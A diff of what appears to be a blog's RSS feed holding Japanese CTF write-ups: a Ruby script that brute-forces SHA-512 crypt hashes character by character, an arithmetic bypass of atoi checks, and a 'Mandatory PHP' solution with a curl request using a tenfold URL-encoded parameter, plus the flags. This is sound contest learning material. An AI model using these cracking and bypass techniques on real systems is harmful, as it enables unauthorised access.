-  ans &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; i&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;chr
-  &lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Passed&amp;#34;&lt;/span&gt;
-  &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;break&lt;/span&gt;
-&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
-&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
+  &lt;span style=&#34;color:#666&#34;&gt;0x1f&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;upto(&lt;span style=&#34;color:#666&#34;&gt;0x7e&lt;/span&gt;) &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;do&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;|&lt;/span&gt;i&lt;span style=&#34;color:#666&#34;&gt;|&lt;/span&gt;
+    hashpass &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;UnixCrypt&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#800&#34;&gt;SHA512&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;build(i&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;chr, salt)
+    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt; hashpass &lt;span style=&#34;color:#666&#34;&gt;==&lt;/span&gt; enc
+      ans &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; i&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;chr
+      &lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Passed&amp;#34;&lt;/span&gt;
+      &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;break&lt;/span&gt;
+    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
+  &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
 &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
 
 encrypted &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;File&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;read(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;./encrypted.txt&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;chomp
-&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;VolgaCTF{&lt;/span&gt;&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;#{&lt;/span&gt;encrypted&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;tr(org&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;join(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;), ans&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;join(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;))&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;}&amp;#34;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;&lt;strong&gt;VolgaCTF{pass_hash_cracking_hashcat_always_lurks_in_the_shadows}&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;VolgaCTF{&lt;/span&gt;&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;#{&lt;/span&gt;encrypted&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;tr(org&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;join(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;), ans&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;join(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;))&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;}&amp;#34;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;VolgaCTF{pass_hash_cracking_hashcat_always_lurks_in_the_shadows}&lt;/strong&gt;&lt;/li&gt;
 &lt;/ul&gt;
 </description>
     </item>
@@ -945,18 +935,20 @@ encrypted &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&
 
 &lt;ul&gt;
 &lt;li&gt;バイナリを読むと、渡された乱数3つがチェック用の値になっている&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;入力文字列を10byteずつ分割してatoiに流し込んでいて、以下の式が成り立てばおｋなので、あとは算数&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;x + y = a1
+&lt;li&gt;入力文字列を10byteずつ分割してatoiに流し込んでいて、以下の式が成り立てばおｋなので、あとは算数
+&lt;code&gt;
+x + y = a1
 y + z = a2
-x + z = a3&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;自分が解いたときのケース&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;Can you cook my favourite food using these ingredients :)
+x + z = a3
+&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;自分が解いたときのケース
+&lt;code&gt;
+Can you cook my favourite food using these ingredients :)
 -10026 ; -8250 ; -12490 ;
 -000007133-000002893-000005357
-That&amp;#39;s yummy.... Here is your gift:
-pctf{p1zz4_t0pp3d_w1th_p1n34ppl3_s4uc3}&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+That&#39;s yummy.... Here is your gift:
+pctf{p1zz4_t0pp3d_w1th_p1n34ppl3_s4uc3}
+&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;h2 id=&#34;game-of-faces&#34;&gt;Game of Faces&lt;/h2&gt;
@@ -994,7 +986,8 @@ pctf{p1zz4_t0pp3d_w1th_p1n34ppl3_s4uc3}&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
 &lt;h2 id=&#34;mandatory-php&#34;&gt;Mandatory PHP&lt;/h2&gt;
 
 &lt;ul&gt;
-&lt;li&gt;&lt;p&gt;以下のPHPのコードが渡される&lt;/p&gt;
+&lt;li&gt;以下のPHPのコードが渡される&lt;/li&gt;
+&lt;/ul&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#bc7a00&#34;&gt;&amp;lt;?php&lt;/span&gt; 
 &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;include&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;flag.php&amp;#39;&lt;/span&gt;; 
 highlight_file(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;index.php&amp;#39;&lt;/span&gt;); 
@@ -1009,30 +1002,28 @@ highlight_file(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;index.php&amp;
 &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#19177c&#34;&gt;$c&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#19177c&#34;&gt;$d&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#19177c&#34;&gt;$d&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#19177c&#34;&gt;$c&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#19177c&#34;&gt;$a&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#19177c&#34;&gt;$c&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#19177c&#34;&gt;$c&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#19177c&#34;&gt;$d&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#19177c&#34;&gt;$d&lt;/span&gt;) 
 &lt;span style=&#34;color:#19177c&#34;&gt;$s1&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;; 
 &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;else&lt;/span&gt; 
-&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Bye...&amp;#34;&lt;/span&gt;); 
+    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Bye...&amp;#34;&lt;/span&gt;); 
 &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#19177c&#34;&gt;$s1&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;===&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;) 
-&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#19177c&#34;&gt;$flag1&lt;/span&gt;; 
+    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#19177c&#34;&gt;$flag1&lt;/span&gt;; 
 &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#19177c&#34;&gt;$i&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;;&lt;span style=&#34;color:#19177c&#34;&gt;$i&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;&amp;lt;=&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;10&lt;/span&gt;;&lt;span style=&#34;color:#19177c&#34;&gt;$i&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;++&lt;/span&gt;){ 
-&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#19177c&#34;&gt;$b&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;==&lt;/span&gt;urldecode(&lt;span style=&#34;color:#19177c&#34;&gt;$b&lt;/span&gt;)) 
-    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;duck&amp;#39;&lt;/span&gt;); 
-&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;else&lt;/span&gt; 
-    &lt;span style=&#34;color:#19177c&#34;&gt;$b&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;urldecode(&lt;span style=&#34;color:#19177c&#34;&gt;$b&lt;/span&gt;); 
+    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#19177c&#34;&gt;$b&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;==&lt;/span&gt;urldecode(&lt;span style=&#34;color:#19177c&#34;&gt;$b&lt;/span&gt;)) 
+        &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;duck&amp;#39;&lt;/span&gt;); 
+    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;else&lt;/span&gt; 
+        &lt;span style=&#34;color:#19177c&#34;&gt;$b&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;urldecode(&lt;span style=&#34;color:#19177c&#34;&gt;$b&lt;/span&gt;); 
 }     
 &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#19177c&#34;&gt;$b&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;===&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;WoAHh!&amp;#34;&lt;/span&gt;) 
 &lt;span style=&#34;color:#19177c&#34;&gt;$s2&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;; 
 &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;else&lt;/span&gt; 
-&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;oops..&amp;#39;&lt;/span&gt;); 
+    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;oops..&amp;#39;&lt;/span&gt;); 
 &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#19177c&#34;&gt;$s2&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;===&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;) 
-&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#19177c&#34;&gt;$flag2&lt;/span&gt;; 
+    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#19177c&#34;&gt;$flag2&lt;/span&gt;; 
 &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;end...&amp;#39;&lt;/span&gt;); 
 &lt;span style=&#34;color:#bc7a00&#34;&gt;?&amp;gt;&lt;/span&gt; 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;&lt;code&gt;val1&lt;/code&gt;が&lt;code&gt;INF&lt;/code&gt;になるので、&lt;code&gt;val3&lt;/code&gt;と&lt;code&gt;val4&lt;/code&gt;でINFになるようにデカイ数を渡して、&lt;code&gt;val2&lt;/code&gt;は10回urldecodeして&lt;code&gt;WoAHh!&lt;/code&gt;になるようにパラメータを渡せば良い&lt;/p&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;&lt;code&gt;curl &#39;http://159.89.166.12:14000///index.php?ffval1=0&amp;amp;val2=WoAHh%2525252525252525252521&amp;amp;val3=101&amp;amp;val4=大きい値&#39;&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;&lt;code&gt;pctf{b3_c4r3fu1_w1th_pHp_f31145}&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;val1&lt;/code&gt;が&lt;code&gt;INF&lt;/code&gt;になるので、&lt;code&gt;val3&lt;/code&gt;と&lt;code&gt;val4&lt;/code&gt;でINFになるようにデカイ数を渡して、&lt;code&gt;val2&lt;/code&gt;は10回urldecodeして&lt;code&gt;WoAHh!&lt;/code&gt;になるようにパラメータを渡せば良い&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;curl &#39;http://159.89.166.12:14000///index.php?ffval1=0&amp;amp;val2=WoAHh%2525252525252525252521&amp;amp;val3=101&amp;amp;val4=大きい値&#39;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;pctf{b3_c4r3fu1_w1th_pHp_f31145}&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;h2 id=&#34;終了後に解いた問題&#34;&gt;終了後に解いた問題&lt;/h2&gt;
